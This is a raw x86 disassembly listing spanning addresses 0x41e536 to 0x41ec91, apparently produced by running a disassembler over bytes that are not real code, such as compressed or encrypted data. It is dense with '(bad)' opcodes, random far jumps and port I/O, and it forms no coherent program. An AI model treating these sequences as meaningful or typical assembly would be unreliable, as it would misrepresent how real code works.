  41e536:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e538:	bound  ebp,QWORD PTR [ecx]
  41e53a:	aam    0x3a
  41e53c:	jmp    0x866:0xce0c7a82
  41e543:	jg     0x41e503
  41e545:	xor    al,0x4d
  41e547:	rcl    BYTE PTR [ebx+0x14],cl
  41e54a:	aaa    
  41e54b:	rol    BYTE PTR [edx-0xd20e651],1
  41e551:	into   
  41e552:	inc    edx
  41e553:	adc    BYTE PTR [edi+0x3bdbd0a5],dh
  41e559:	out    0x7b,eax
  41e55b:	fld    QWORD PTR [eax]
  41e55d:	xchg   bh,bh
  41e55f:	fnstsw WORD PTR [esi-0x4e51b758]
  41e565:	pop    ebx
  41e566:	jge    0x41e51f
  41e568:	or     BYTE PTR [ebp+0x1c3ee1bf],0xdc
  41e56f:	lds    edx,FWORD PTR [ecx+0x64058e29]
  41e575:	rcl    BYTE PTR [ebx-0x45],cl
  41e578:	fwait
  41e579:	and    BYTE PTR [edi+0x9582f4b],al
  41e57f:	xchg   ebp,eax
  41e580:	data16 jle 0x41e554
  41e583:	cli    
  41e584:	push   ebx
  41e585:	repz (bad) 
  41e587:	lds    ebp,FWORD PTR [eax+0x52]
  41e58a:	and    bl,BYTE PTR [ebp-0x65]
  41e58d:	cdq    
  41e58e:	jmp    0x893c9c1
  41e593:	fstp   QWORD PTR [ecx]
  41e595:	stos   DWORD PTR es:[edi],eax
  41e596:	loopne 0x41e5b5
  41e598:	push   eax
  41e599:	pop    ebp
  41e59a:	ficomp DWORD PTR [eax+0x20dc8ce7]
  41e5a0:	(bad)
  41e5a3:	or     BYTE PTR [ebp-0x23],bh
  41e5a6:	(bad)  
  41e5a7:	push   cs
  41e5a8:	test   dh,0xba
  41e5ab:	push   ebx
  41e5ac:	retf   0x336
  41e5af:	add    eax,0xfd33d7a7
  41e5b4:	inc    edi
  41e5b5:	dec    edi
  41e5b6:	or     ebp,DWORD PTR [edi+ecx*2]
  41e5b9:	inc    ebx
  41e5ba:	outs   dx,BYTE PTR ds:[esi]
  41e5bb:	cmp    dl,BYTE PTR [edi]
  41e5bd:	mov    al,0x46
  41e5bf:	pop    eax
  41e5c0:	(bad)  
  41e5c1:	iret   
  41e5c2:	and    al,0x7
  41e5c4:	cs iret 
  41e5c6:	stc    
  41e5c7:	add    al,0x80
  41e5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5ca:	daa    
  41e5cb:	inc    esp
  41e5cc:	nop
  41e5cd:	mov    esp,0x93304df7
  41e5d2:	push   ecx
  41e5d3:	mov    edi,0x49fb448f
  41e5d8:	cld    
  41e5d9:	add    ah,BYTE PTR [ebx]
  41e5db:	jmp    0xec4ccaf5
  41e5e0:	cmp    al,0xf4
  41e5e2:	mov    esi,0x33bea78f
  41e5e7:	jns    0x41e63b
  41e5e9:	loope  0x41e645
  41e5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5ec:	lea    edx,[esi-0x4edd6357]
  41e5f2:	repz ffreep st(7)
  41e5f5:	sbb    eax,0xc210d4a0
  41e5fa:	(bad)  
  41e5fb:	out    0x66,eax
  41e5fd:	std    
  41e5fe:	int    0x98
  41e600:	mov    esi,0x4f4e6ee2
  41e605:	popa   
  41e606:	pop    ebx
  41e607:	inc    eax
  41e608:	out    0x51,al
  41e60a:	stos   DWORD PTR es:[edi],eax
  41e60b:	adc    BYTE PTR [eax+0x5a],cl
  41e60e:	call   DWORD PTR [ebx-0x2a1e32e3]
  41e614:	lods   eax,DWORD PTR ds:[esi]
  41e615:	(bad)  
  41e616:	inc    eax
  41e617:	mov    edi,0x74068e4b
  41e61c:	(bad)  
  41e61d:	inc    eax
  41e61e:	fs gs jg 0x41e5c8
  41e622:	aas    
  41e623:	fs fwait
  41e625:	mov    al,0x1a
  41e627:	fdivr  st,st(3)
  41e629:	mov    BYTE PTR [ecx+0xf89d101],0x53
  41e630:	mov    ds:0x5d12a48a,al
  41e635:	loop   0x41e5cf
  41e637:	cmp    DWORD PTR [ebx],esp
  41e639:	bound  ecx,QWORD PTR [ebp-0x7ea174b1]
  41e63f:	ds in  eax,dx
  41e641:	shl    DWORD PTR ss:[esp+ebp*4+0x37],cl
  41e646:	add    DWORD PTR [ecx-0x7e],0xb358e63b
  41e64d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e64e:	inc    DWORD PTR [ecx+0x7b]
  41e651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e652:	test   al,0x1e
  41e654:	xchg   edx,eax
  41e655:	pop    ds
  41e656:	inc    edi
  41e657:	sbb    esi,edx
  41e659:	mov    ecx,0x3fb86482
  41e65e:	cmp    DWORD PTR [edi+esi*8],edx
  41e661:	mov    edx,0xf838a623
  41e666:	aam    0x11
  41e668:	xchg   ebx,eax
  41e669:	retf   
  41e66a:	call   0xb7b3b015
  41e66f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e670:	int3   
  41e671:	fsub   st,st(6)
  41e673:	fwait
  41e674:	add    dh,bh
  41e676:	xor    DWORD PTR [esp+edx*1],0x20a92282
  41e67d:	js     0x41e62f
  41e67f:	pop    es
  41e680:	jmp    0x6a1f4be4
  41e685:	and    ecx,DWORD PTR [eax-0x692b234e]
  41e68b:	ror    BYTE PTR [edi],cl
  41e68d:	sub    DWORD PTR [edi+edx*8-0x28],ecx
  41e691:	pop    esp
  41e692:	mov    eax,0x99962124
  41e697:	push   esi
  41e698:	add    DWORD PTR [edx+0x49e63e84],edi
  41e69e:	loopne 0x41e6fb
  41e6a0:	cmp    eax,DWORD PTR [eax]
  41e6a2:	mov    dl,0xcf
  41e6a4:	jno    0x41e6f0
  41e6a6:	stos   BYTE PTR es:[edi],al
  41e6a7:	jg     0x41e67e
  41e6a9:	mov    bl,0x27
  41e6ab:	push   ecx
  41e6ac:	addr16 int3 
  41e6ae:	mov    ch,BYTE PTR [edx+0x1396e903]
  41e6b4:	ror    DWORD PTR [eax],0x59
  41e6b7:	push   ecx
  41e6b8:	mov    DWORD PTR [ebp-0x18],edi
  41e6bb:	std    
  41e6bc:	icebp  
  41e6bd:	or     eax,0x674d42a3
  41e6c2:	mov    WORD PTR [esi-0x3a],ss
  41e6c5:	inc    eax
  41e6c6:	in     al,dx
  41e6c7:	push   ss
  41e6c8:	jmp    0x41e6fe
  41e6ca:	rcl    DWORD PTR [ebp+0x5],0x43
  41e6ce:	pop    eax
  41e6cf:	sbb    edi,DWORD PTR [eax]
  41e6d1:	add    cl,BYTE PTR [edx-0xfe7cf29]
  41e6d7:	scas   eax,DWORD PTR es:[edi]
  41e6d8:	in     eax,0xcb
  41e6da:	aam    0x58
  41e6dc:	(bad)  [ebp+0x1d4b129]
  41e6e2:	ins    DWORD PTR es:[edi],dx
  41e6e3:	into   
  41e6e4:	inc    ebx
  41e6e5:	ja     0x41e6e0
  41e6e7:	mov    cs:0x62b19010,eax
  41e6ed:	mov    dl,0xa8
  41e6ef:	push   ecx
  41e6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f1:	sar    BYTE PTR [edx-0x20543531],0xd2
  41e6f8:	adc    edi,DWORD PTR [ebp+0x6d1d0ed2]
  41e6fe:	popa   
  41e6ff:	add    eax,0xada1f263
  41e704:	mov    bh,0x8a
  41e706:	std    
  41e707:	jle    0x41e6dd
  41e709:	inc    eax
  41e70a:	(bad)  
  41e70b:	adc    al,0x28
  41e70d:	and    BYTE PTR [ebx],0xe5
  41e710:	stos   DWORD PTR es:[edi],eax
  41e711:	mov    cl,0x2d
  41e713:	push   ebp
  41e714:	out    0xc8,al
  41e716:	neg    DWORD PTR ds:0xfce58dcc
  41e71c:	xor    BYTE PTR [ebp-0x6a],ah
  41e71f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e720:	aam    0x55
  41e722:	popaw  
  41e724:	ret    
  41e725:	jge    0x41e79f
  41e727:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e729:	adc    DWORD PTR [ebx],ebx
  41e72b:	fcomi  st,st(7)
  41e72d:	aad    0x3
  41e72f:	dec    edx
  41e730:	ret    
  41e731:	push   cs
  41e732:	stos   DWORD PTR es:[edi],eax
  41e733:	fimul  DWORD PTR [edi]
  41e735:	pop    edx
  41e736:	fcomip st,st(6)
  41e738:	pop    ds
  41e739:	pop    ecx
  41e73a:	fcomp  QWORD PTR [esi]
  41e73c:	lea    edx,[edi+0x1445dabc]
  41e742:	jnp    0x41e778
  41e744:	(bad)  [ecx+0x55f49077]
  41e74a:	ror    edi,0x39
  41e74d:	shl    DWORD PTR [ebx+esi*8+0x8479def],0x28
  41e755:	(bad)  
  41e756:	push   edi
  41e757:	gs jecxz 0x41e738
  41e75a:	jbe    0x41e6e1
  41e75c:	jecxz  0x41e7ca
  41e75e:	or     al,0xae
  41e760:	sub    dl,BYTE PTR [ebp+0x7f727a5e]
  41e766:	inc    edi
  41e767:	xchg   ecx,eax
  41e768:	in     al,0x22
  41e76a:	and    ah,BYTE PTR [ecx+0x4]
  41e76d:	outs   dx,BYTE PTR ds:[esi]
  41e76e:	mov    ds:0x9fc98cb,al
  41e773:	xlat   BYTE PTR ds:[ebx]
  41e774:	jae    0x41e718
  41e776:	push   edx
  41e777:	sahf   
  41e778:	push   cs
  41e779:	ret    0x6e8a
  41e77c:	xchg   ebx,eax
  41e77d:	sti    
  41e77e:	stc    
  41e77f:	xchg   edi,eax
  41e780:	add    al,ah
  41e782:	sahf   
  41e783:	sub    ebp,DWORD PTR [ebx]
  41e785:	in     eax,dx
  41e786:	pop    eax
  41e787:	je     0x41e7c3
  41e789:	add    BYTE PTR [ebx-0x28501f44],bh
  41e78f:	jmp    0xb113:0xcb81087f
  41e796:	jecxz  0x41e779
  41e798:	in     al,dx
  41e799:	and    BYTE PTR [edi],bl
  41e79b:	cmp    al,0xf8
  41e79d:	and    eax,0x1884b090
  41e7a2:	fld    QWORD PTR [edx]
  41e7a4:	leave  
  41e7a5:	ror    BYTE PTR [edx-0x1a],cl
  41e7a8:	pop    edx
  41e7a9:	popa   
  41e7aa:	bound  ecx,QWORD PTR [edx-0x3d796552]
  41e7b0:	push   ds
  41e7b1:	sub    eax,0x3fae3d23
  41e7b6:	cmp    al,0xe8
  41e7b8:	ins    BYTE PTR es:[edi],dx
  41e7b9:	add    ecx,edx
  41e7bb:	adc    ah,BYTE PTR [eax+0x7d920932]
  41e7c1:	je     0x41e811
  41e7c3:	(bad)  
  41e7c4:	or     esi,DWORD PTR [edi]
  41e7c6:	inc    eax
  41e7c7:	les    esi,FWORD PTR [edi+eax*8-0x2d0e61d9]
  41e7ce:	jg     0x41e767
  41e7d0:	fldpi  
  41e7d2:	add    ah,BYTE PTR [esi+0x4e825aa9]
  41e7d8:	pop    ecx
  41e7d9:	test   dh,dh
  41e7db:	fld    TBYTE PTR [edi+0xf]
  41e7de:	cmp    edx,edi
  41e7e0:	imul   esp,DWORD PTR [eax],0xd06a19b9
  41e7e6:	shl    esi,cl
  41e7e8:	fwait
  41e7e9:	adc    DWORD PTR [ebx],ecx
  41e7eb:	jnp    0x41e810
  41e7ed:	fcom   DWORD PTR [ebx-0x3fd9489a]
  41e7f3:	fcmovne st,st(4)
  41e7f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e7f6:	cmc    
  41e7f7:	arpl   bx,sp
  41e7f9:	cmc    
  41e7fa:	inc    edx
  41e7fb:	pop    edi
  41e7fc:	mov    bl,0x73
  41e7fe:	dec    ebx
  41e7ff:	pop    ebx
  41e800:	pop    es
  41e801:	clc    
  41e802:	je     0x41e840
  41e804:	adc    DWORD PTR [eax+0x65],ebp
  41e807:	jnp    0x41e85f
  41e809:	les    ecx,FWORD PTR [edx+0x43]
  41e80c:	mov    esi,DWORD PTR [edi+0x73a64822]
  41e812:	int3   
  41e813:	mov    esi,0xf849017b
  41e818:	leave  
  41e819:	jl     0x41e7e0
  41e81b:	and    DWORD PTR [esi],eax
  41e81d:	test   al,0x87
  41e81f:	pop    ds
  41e820:	f2xm1  
  41e822:	pop    eax
  41e823:	cmc    
  41e824:	out    dx,eax
  41e825:	inc    edx
  41e826:	dec    esi
  41e827:	jae    0x41e809
  41e829:	xchg   edi,eax
  41e82a:	push   eax
  41e82b:	or     BYTE PTR [ebx+eax*8-0x62527511],bh
  41e832:	pop    esi
  41e833:	ror    edi,0xdb
  41e836:	push   ebx
  41e837:	push   edi
  41e838:	scas   al,BYTE PTR es:[edi]
  41e839:	xchg   edx,eax
  41e83a:	sar    esi,cl
  41e83c:	sub    BYTE PTR [ebx+0x76],dl
  41e83f:	jno    0x41e87d
  41e841:	xchg   DWORD PTR [esi],ebx
  41e843:	push   eax
  41e844:	pop    ebx
  41e845:	or     bl,dl
  41e847:	cmp    BYTE PTR [esi-0x40dcb3b1],ah
  41e84d:	xchg   ebx,eax
  41e84e:	inc    ebx
  41e84f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e850:	cmp    ebp,DWORD PTR [ebx+0x7f58d916]
  41e856:	mov    ecx,0x706e1d5b
  41e85b:	lods   al,BYTE PTR ds:[esi]
  41e85c:	fld    DWORD PTR [edi-0x3521220a]
  41e862:	(bad)  
  41e863:	fmul   st(5),st
  41e865:	mov    ds:0x480fb936,eax
  41e86a:	sahf   
  41e86b:	(bad)  
  41e86c:	fwait
  41e86d:	push   ebx
  41e86e:	inc    eax
  41e86f:	mov    edx,0x7a7a8a4
  41e874:	jnp    0x41e8ad
  41e876:	fwait
  41e877:	xor    BYTE PTR [eax-0x613ef935],dh
  41e87d:	sti    
  41e87e:	test   DWORD PTR [ecx],ebp
  41e880:	(bad)  
  41e881:	jnp    0x41e853
  41e883:	repnz sbb edi,DWORD PTR [esi]
  41e886:	imul   ebp,DWORD PTR [ecx+0x6231239f],0x233aa0c5
  41e890:	sub    edx,ecx
  41e892:	out    0x42,al
  41e894:	inc    esp
  41e895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e896:	rcl    bh,1
  41e898:	push   esi
  41e899:	xor    ch,BYTE PTR [ebx+ecx*2]
  41e89c:	mov    ebx,DWORD PTR [ebx+0x1ee634be]
  41e8a2:	or     al,0x2e
  41e8a4:	jle    0x41e8dc
  41e8a6:	jmp    0x41e90b
  41e8a8:	scas   eax,DWORD PTR es:[edi]
  41e8a9:	cld    
  41e8aa:	sub    al,0xf1
  41e8ac:	fbld   TBYTE PTR [ecx]
  41e8ae:	ins    BYTE PTR es:[edi],dx
  41e8af:	ss call 0xf747:0x8df4e16f
  41e8b7:	imul   ebx,DWORD PTR [eax-0x58d46f1a],0xd31c7c46
  41e8c1:	add    DWORD PTR [edx+edx*2+0x7b],esp
  41e8c5:	push   0xffffff85
  41e8c7:	pop    edi
  41e8c8:	loop   0x41e943
  41e8ca:	xor    al,BYTE PTR [edx-0x74a67ddb]
  41e8d0:	xor    esi,esp
  41e8d2:	dec    ebp
  41e8d3:	add    ax,0x8260
  41e8d7:	popa   
  41e8d8:	daa    
  41e8d9:	mov    eax,0xf692ff32
  41e8de:	push   edi
  41e8df:	add    eax,0x9019ddac
  41e8e4:	push   ds
  41e8e5:	cmp    ah,0x18
  41e8e8:	xchg   ebp,eax
  41e8e9:	jg     0x41e88d
  41e8eb:	mov    dh,0x3d
  41e8ed:	fwait
  41e8ee:	adc    eax,0x3636ef1a
  41e8f3:	fisttp DWORD PTR ds:0xe649a389
  41e8f9:	add    eax,0xe708d4e3
  41e8fe:	leave  
  41e8ff:	popa   
  41e900:	and    BYTE PTR [ebx+0x67],bh
  41e903:	add    DWORD PTR [esi],esi
  41e905:	stos   BYTE PTR es:[edi],al
  41e906:	pusha  
  41e907:	cli    
  41e908:	pop    es
  41e909:	sbb    ah,ah
  41e90b:	mov    ebp,0xc98a2705
  41e910:	rdtsc  
  41e912:	mov    edx,0xf60b67d
  41e917:	fwait
  41e918:	mov    ah,0x83
  41e91a:	mov    ecx,0xc7df804d
  41e91f:	aas    
  41e920:	sahf   
  41e921:	xchg   edi,eax
  41e922:	xchg   ebp,eax
  41e923:	in     al,dx
  41e924:	in     al,dx
  41e925:	xor    eax,0x8976f132
  41e92a:	in     eax,0x94
  41e92c:	mov    al,ds:0x2787ab41
  41e931:	adc    esp,DWORD PTR [ebx]
  41e933:	and    BYTE PTR [esi+ebp*2-0x57],dl
  41e937:	mov    dl,0x1d
  41e939:	jmp    0x8088:0x331abd86
  41e940:	out    dx,al
  41e941:	mov    ds:0xfff4e2d7,eax
  41e946:	scas   eax,DWORD PTR es:[edi]
  41e947:	jns    0x41e9b3
  41e949:	push   ss
  41e94a:	mov    dh,0xd0
  41e94c:	out    0x5e,eax
  41e94e:	add    esi,DWORD PTR [ebx+0x13]
  41e951:	pushf  
  41e952:	clc    
  41e953:	sub    DWORD PTR [ecx+0x7e6359bf],0x76
  41e95a:	xchg   edx,eax
  41e95b:	lods   al,BYTE PTR ds:[esi]
  41e95c:	mov    edx,0xb25cba4f
  41e961:	cmp    eax,0xd3b4fc4d
  41e966:	aam    0xd6
  41e968:	push   cs
  41e969:	xchg   BYTE PTR [ecx-0x6d2ab52],ah
  41e96f:	loope  0x41e931
  41e971:	push   eax
  41e972:	pop    eax
  41e973:	enter  0x7bd3,0xc5
  41e977:	mov    ch,0x76
  41e979:	adc    edx,ebx
  41e97b:	bound  edx,QWORD PTR [ecx+0xe14f8a8]
  41e981:	loopne 0x41e925
  41e983:	aas    
  41e984:	je     0x41e992
  41e986:	shl    esp,0x79
  41e989:	imul   ecx,DWORD PTR [ebx-0x4a92b05],0x7723b052
  41e993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e994:	push   ebx
  41e995:	mov    esp,0x6c61462f
  41e99a:	xor    dh,BYTE PTR [esi-0x60]
  41e99d:	lock jge 0x41e95e
  41e9a0:	sbb    ah,BYTE PTR [bx]
  41e9a3:	and    BYTE PTR [eax-0x6f9bfc37],cl
  41e9a9:	inc    edi
  41e9aa:	and    eax,edx
  41e9ac:	adc    ah,ch
  41e9ae:	call   0xf082:0x97dde390
  41e9b5:	xor    ah,bl
  41e9b7:	ja     0x41ea30
  41e9b9:	lahf   
  41e9ba:	and    BYTE PTR [edx-0x15],0xa
  41e9be:	imul   DWORD PTR [ebp+0x42]
  41e9c1:	or     eax,0xca5f440e
  41e9c6:	int3   
  41e9c7:	cmp    DWORD PTR [edx],eax
  41e9c9:	imul   edi,DWORD PTR ds:0x21bdf906,0x70
  41e9d0:	ja     0x41e9f5
  41e9d2:	(bad)  
  41e9d4:	scas   eax,DWORD PTR es:[edi]
  41e9d5:	mov    bh,0x29
  41e9d7:	add    ebx,DWORD PTR [edx-0x30]
  41e9da:	pop    ss
  41e9db:	and    cl,0xc4
  41e9de:	ins    DWORD PTR es:[edi],dx
  41e9df:	dec    esp
  41e9e0:	fdivp  st(1),st
  41e9e2:	jle    0x41e9c8
  41e9e4:	je     0x41e98f
  41e9e6:	out    0x57,eax
  41e9e8:	sbb    al,ch
  41e9ea:	leave  
  41e9eb:	add    al,0xe7
  41e9ed:	repnz sub al,0x6d
  41e9f0:	hlt    
  41e9f1:	stos   DWORD PTR es:[edi],eax
  41e9f2:	popf   
  41e9f3:	xor    ebx,DWORD PTR [edx-0x74a7f8a3]
  41e9f9:	push   ebp
  41e9fa:	mov    ch,0xbd
  41e9fc:	xchg   esi,eax
  41e9fd:	adc    BYTE PTR [esi],bl
  41e9ff:	dec    ecx
  41ea00:	jno    0x41ea52
  41ea02:	in     eax,dx
  41ea03:	or     BYTE PTR [edx+edx*1],0x63
  41ea07:	outs   dx,BYTE PTR ds:[esi]
  41ea08:	sub    DWORD PTR [edx-0x76a3048d],ebx
  41ea0e:	pop    ss
  41ea0f:	add    esp,edx
  41ea11:	push   ebp
  41ea12:	mov    al,ds:0x1c10c9a4
  41ea17:	sbb    esp,edi
  41ea19:	pop    ecx
  41ea1a:	cdq    
  41ea1b:	add    eax,0xc204b26f
  41ea20:	outs   dx,BYTE PTR ds:[esi]
  41ea21:	pop    ds
  41ea22:	cmp    al,0x99
  41ea24:	inc    esi
  41ea25:	in     eax,0xcb
  41ea27:	mov    DWORD PTR [edx-0x68],eax
  41ea2a:	ss mov ecx,0x75bdf505
  41ea30:	mov    al,ds:0x1eee9d08
  41ea35:	iret   
  41ea36:	ins    DWORD PTR es:[edi],dx
  41ea37:	push   esi
  41ea38:	xchg   bh,al
  41ea3a:	lds    ebp,FWORD PTR [edx+0x2d]
  41ea3d:	mov    eax,0x9b1c9497
  41ea42:	and    al,0xc8
  41ea44:	sbb    BYTE PTR [edi-0x1b],al
  41ea47:	adc    al,BYTE PTR [eax+0xedd7fea]
  41ea4d:	sub    eax,edx
  41ea4f:	cmp    ecx,0x47
  41ea52:	mov    eax,ds:0x73ad5c31
  41ea57:	arpl   WORD PTR [edi+ecx*8+0x52],bp
  41ea5b:	or     eax,0x76328b17
  41ea60:	imul   ebx,DWORD PTR [ebx+ebx*1],0x76a8b2be
  41ea67:	push   edi
  41ea68:	sub    eax,0xfe823c95
  41ea6d:	sub    eax,0xb79fbc71
  41ea72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea73:	push   esp
  41ea74:	pop    ebx
  41ea75:	aad    0x78
  41ea77:	sar    ebp,0xd0
  41ea7a:	pop    esp
  41ea7b:	mov    esp,0xe0b0a5a7
  41ea80:	dec    edi
  41ea81:	and    DWORD PTR [ebx],esp
  41ea83:	stc    
  41ea84:	mov    eax,ds:0xcb9bc755
  41ea89:	dec    edx
  41ea8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea8b:	push   ecx
  41ea8c:	clc    
  41ea8d:	inc    edx
  41ea8e:	stos   DWORD PTR es:[edi],eax
  41ea8f:	mov    al,ds:0x55e3aae2
  41ea94:	les    esi,FWORD PTR [edx-0x63]
  41ea97:	mov    eax,ds:0xa7ce6efa
  41ea9c:	and    DWORD PTR [eax+esi*4],0x892b933a
  41eaa3:	cmp    al,0xa1
  41eaa5:	cmp    esp,esi
  41eaa7:	repz scas eax,DWORD PTR es:[edi]
  41eaa9:	jle    0x41ead6
  41eaab:	loop   0x41eaa5
  41eaad:	lea    ecx,[ebx+0x637c141]
  41eab3:	push   ecx
  41eab4:	add    BYTE PTR [ebx-0x79],bl
  41eab7:	add    ecx,DWORD PTR [edi-0x16]
  41eaba:	std    
  41eabb:	cmp    BYTE PTR [ecx+0x38],cl
  41eabe:	xchg   DWORD PTR [ebx],esp
  41eac0:	and    ebp,DWORD PTR [eax+0x40]
  41eac3:	cmp    BYTE PTR [ebp-0x4e3ff2c4],ch
  41eac9:	mov    WORD PTR [ecx],fs
  41eacb:	sahf   
  41eacc:	aam    0x38
  41eace:	or     edx,DWORD PTR [edi-0x60c8bfd3]
  41ead4:	push   cs
  41ead5:	fld    DWORD PTR [ebp-0x6dfa8371]
  41eadb:	sub    dl,BYTE PTR [ebp+0x11f805e5]
  41eae1:	retf   
  41eae2:	dec    eax
  41eae3:	(bad)  
  41eae4:	stc    
  41eae5:	fwait
  41eae6:	adc    ebx,DWORD PTR [edx]
  41eae8:	loop   0x41eb58
  41eaea:	cmp    eax,0xc1847ac2
  41eaef:	in     al,0xf4
  41eaf1:	push   ss
  41eaf2:	sar    BYTE PTR [edx-0x78],cl
  41eaf5:	out    0xce,eax
  41eaf7:	ficom  DWORD PTR [ecx-0x5f3db36c]
  41eafd:	add    DWORD PTR [edx],eax
  41eaff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb00:	outs   dx,DWORD PTR ds:[esi]
  41eb01:	sub    DWORD PTR [ebp-0x21],0xffffffe7
  41eb05:	leave  
  41eb06:	test   eax,0xb90ed17b
  41eb0b:	sbb    DWORD PTR [ecx],ebp
  41eb0d:	mov    ah,0x24
  41eb0f:	js     0x41eb6c
  41eb11:	cli    
  41eb12:	jmp    0x4b95:0xa2107282
  41eb19:	(bad)  
  41eb1a:	std    
  41eb1b:	jecxz  0x41eabe
  41eb1d:	and    al,0x5e
  41eb1f:	or     esi,eax
  41eb21:	mov    dl,0xa0
  41eb23:	mov    eax,0x3193d5e7
  41eb28:	je     0x41eb81
  41eb2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb2b:	push   esp
  41eb2c:	push   esp
  41eb2d:	loop   0x41ead5
  41eb2f:	cmc    
  41eb30:	dec    eax
  41eb31:	and    dh,ch
  41eb33:	push   0x6c3b72e9
  41eb38:	jmp    DWORD PTR [edi+eiz*1-0x1d]
  41eb3c:	adc    cl,BYTE PTR [bx+si-0x41c7]
  41eb41:	xchg   esi,eax
  41eb42:	loopne 0x41eac6
  41eb44:	lods   al,BYTE PTR ds:[esi]
  41eb45:	call   0xded8:0xcfc3b842
  41eb4c:	outs   dx,BYTE PTR ds:[esi]
  41eb4d:	test   eax,0x12c87258
  41eb52:	mov    dl,0x65
  41eb54:	shl    edx,cl
  41eb56:	add    BYTE PTR [edi-0x3d61a0d],0x12
  41eb5d:	adc    eax,0x9b79731c
  41eb62:	jle    0x41eb78
  41eb64:	inc    ecx
  41eb65:	cld    
  41eb66:	outs   dx,BYTE PTR ds:[esi]
  41eb67:	add    al,0xb9
  41eb69:	add    BYTE PTR [ebx-0x7],ah
  41eb6c:	shl    DWORD PTR [edi+0x128f1a0d],1
  41eb72:	ficom  DWORD PTR [eax+0x6d]
  41eb75:	xchg   esp,eax
  41eb76:	pop    ss
  41eb77:	pusha  
  41eb78:	sbb    DWORD PTR [edx],ebp
  41eb7a:	dec    eax
  41eb7b:	pop    esi
  41eb7c:	fisub  DWORD PTR [edx]
  41eb7e:	lds    esi,FWORD PTR [edx+edx*4-0x5855ef22]
  41eb85:	cmp    al,0x1c
  41eb87:	ret    0x6159
  41eb8a:	stc    
  41eb8b:	sbb    BYTE PTR [ebp-0x5e27fae],dh
  41eb91:	xchg   ebp,eax
  41eb92:	ds push esp
  41eb94:	loope  0x41ec0b
  41eb96:	ja     0x41eb8b
  41eb98:	mov    bl,BYTE PTR [edx+0x71e82f9f]
  41eb9e:	push   ss
  41eb9f:	and    dl,BYTE PTR [esi+0x5f]
  41eba2:	popa   
  41eba3:	xchg   BYTE PTR [esi+0x5b1a9400],dl
  41eba9:	fdivr  QWORD PTR [esi]
  41ebab:	cld    
  41ebac:	test   al,0x1a
  41ebae:	add    dh,0x44
  41ebb1:	adc    edx,DWORD PTR [ebp+0x37681b25]
  41ebb7:	fnsave [edx]
  41ebb9:	aad    0xc2
  41ebbb:	mov    ebp,0x72cc79a5
  41ebc0:	push   ds
  41ebc1:	jge    0x41ec11
  41ebc3:	clc    
  41ebc4:	add    eax,0x4a04b719
  41ebc9:	repnz call 0xef22:0x13833a3f
  41ebd1:	aam    0xb0
  41ebd3:	popf   
  41ebd4:	mov    ds:0xad6f6f90,eax
  41ebd9:	cmp    DWORD PTR [ecx],esp
  41ebdb:	xchg   DWORD PTR ds:0xdf22be78,ebp
  41ebe1:	test   DWORD PTR [ebx],ebp
  41ebe3:	cld    
  41ebe4:	sub    dh,al
  41ebe6:	shr    bl,cl
  41ebe8:	lock inc ebp
  41ebea:	inc    ebp
  41ebeb:	(bad)
  41ebf0:	out    0x98,eax
  41ebf2:	and    edi,esp
  41ebf4:	push   0xe673aad9
  41ebf9:	rcl    ebp,0x4e
  41ebfc:	cmp    dl,BYTE PTR [ebx-0x44]
  41ebff:	xor    DWORD PTR [ebp-0x29],0x43
  41ec03:	and    al,0x46
  41ec05:	mov    ah,0xd2
  41ec07:	sbb    al,0xb4
  41ec09:	fwait
  41ec0a:	sbb    BYTE PTR [edx+0x6e],ah
  41ec0d:	fcomp  QWORD PTR [ecx+0x19]
  41ec10:	out    dx,al
  41ec11:	xchg   edi,ecx
  41ec13:	sub    edx,ebp
  41ec15:	jle    0x41ec94
  41ec17:	fwait
  41ec18:	ret    0xfe42
  41ec1b:	in     al,dx
  41ec1c:	push   0x9bb1708f
  41ec21:	pushf  
  41ec22:	in     eax,dx
  41ec23:	xchg   ebp,eax
  41ec24:	jmp    0xdcb:0x89ccf8ab
  41ec2b:	sahf   
  41ec2c:	sbb    esi,DWORD PTR [esi+esi*4+0x3]
  41ec30:	stc    
  41ec31:	or     esp,edx
  41ec33:	in     al,dx
  41ec34:	sub    ecx,edx
  41ec36:	lahf   
  41ec37:	mov    esp,eax
  41ec39:	outs   dx,DWORD PTR ds:[esi]
  41ec3a:	sbb    eax,0x48095f04
  41ec3f:	ret    
  41ec40:	ss push esp
  41ec42:	add    BYTE PTR [esp+esi*2+0x64b4239b],dl
  41ec49:	push   0x396a7dae
  41ec4e:	push   cs
  41ec4f:	sar    BYTE PTR [ebp-0x364ea7ca],cl
  41ec55:	xor    DWORD PTR [ebp+0x1e],esi
  41ec58:	addr16 mov cl,0x1d
  41ec5b:	fcmovne st,st(1)
  41ec5d:	lea    ecx,[edx+0x2a]
  41ec60:	pop    ds
  41ec61:	out    dx,eax
  41ec62:	retf   
  41ec63:	dec    ecx
  41ec64:	std    
  41ec65:	arpl   WORD PTR [edi-0x37dffeac],si
  41ec6b:	sub    al,0xc4
  41ec6d:	cdq    
  41ec6e:	jo     0x41ecba
  41ec70:	scas   ax,WORD PTR es:[edi]
  41ec72:	pop    ss
  41ec73:	and    ecx,DWORD PTR [esi+0xb]
  41ec76:	jne    0x41ec33
  41ec78:	sub    BYTE PTR [edx-0x45],ah
  41ec7b:	pop    edi
  41ec7c:	mov    ah,0x67
  41ec7e:	adc    al,0x4a
  41ec80:	jmp    0x514d:0xc3223e86
  41ec87:	xadd   DWORD PTR [ebp-0x30],esp
  41ec8b:	mov    al,ds:0x816328fb
  41ec90:	push   esp
  41ec91:	in     al,0x52
